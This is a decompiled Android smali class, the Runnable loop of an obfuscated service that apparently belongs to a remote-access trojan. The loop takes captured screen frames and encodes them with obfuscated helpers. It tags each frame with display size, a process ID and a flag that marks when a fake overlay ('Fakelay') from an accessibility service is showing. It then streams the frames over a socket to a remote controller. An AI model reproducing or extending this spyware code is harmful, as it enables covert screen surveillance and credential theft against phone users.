.class L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;
.super Ljava/lang/Object;
.source "umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->pr()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;


# direct methods
.method constructor <init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;)V
    .locals 0

    .line 226
    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 230
    :goto_0
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    const/4 v1, 0x1

    const/4 v2, 0x0

    const/4 v3, 0x0

    if-eqz v0, :cond_5

    .line 233
    :try_start_0
    sget-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ctd:Z

    if-eqz v0, :cond_3

    .line 237
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->syc:Ljava/lang/Object;

    monitor-enter v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_1

    .line 238
    :try_start_1
    iget-object v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v4, v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->bts:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_0

    .line 240
    iget-object v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v4, v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->bts:Ljava/util/List;

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [B

    .line 242
    iget-object v5, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v5, v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->bts:Ljava/util/List;

    invoke-interface {v5, v3}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    goto :goto_1

    :cond_0
    move-object v4, v2

    .line 245
    :goto_1
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v4, :cond_4

    :try_start_2
    const-string v0, "n"

    .line 250
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->isblocked:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-static {v5, v6, v7}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 252
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v5, :cond_1

    .line 253
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v5}, Landroid/widget/FrameLayout;->getVisibility()I

    move-result v5

    if-nez v5, :cond_1

    const-string v0, "B"

    .line 260
    :cond_1
    invoke-static {v4}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->hjdoshefvtwzjwegfqnxkpudhrtwmdftxnzcoqguvnijokxiey47([B)[B

    move-result-object v4

    .line 261
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ScreenCap:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->display_height:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->display_width:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->PID:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v4}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->xbrmfjlwbhorittwsyklqcoehuvqnbiizyhqgeasihdzpzplzv42(Ljava/lang/String;[B)[B

    move-result-object v0

    .line 262
    iget-object v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v4, v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    if-nez v4, :cond_2

    .line 263
    iget-object v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;->Instanse()L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    move-result-object v5

    iput-object v5, v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    .line 265
    :cond_2
    iget-object v4, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v4, v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    invoke-virtual {v4, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;->sendBytes([B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    .line 268
    :catch_0
    :try_start_3
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 269
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopForeground(Z)V

    .line 270
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopSelf()V

    .line 271
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    .line 272
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    if-eqz v0, :cond_4

    .line 273
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;->closeSocket()V

    .line 274
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iput-object v2, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_2

    :catchall_0
    move-exception v1

    .line 245
    :try_start_4
    monitor-exit v0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :try_start_5
    throw v1

    .line 280
    :cond_3
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 281
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopForeground(Z)V

    .line 282
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopSelf()V

    .line 283
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    .line 284
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    if-eqz v0, :cond_4

    .line 285
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;->closeSocket()V

    .line 286
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iput-object v2, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_1

    :catch_1
    :cond_4
    :goto_2
    const-wide/16 v0, 0x1

    .line 295
    :try_start_6
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_2

    goto/16 :goto_0

    :catch_2
    nop

    goto/16 :goto_0

    .line 298
    :cond_5
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 299
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0, v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopForeground(Z)V

    .line 300
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopSelf()V

    .line 301
    sput-boolean v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    .line 302
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    if-eqz v0, :cond_6

    .line 303
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iget-object v0, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;->closeSocket()V

    .line 304
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;

    iput-object v2, v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->Screen_Sender:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/SecondarySocket;

    :cond_6
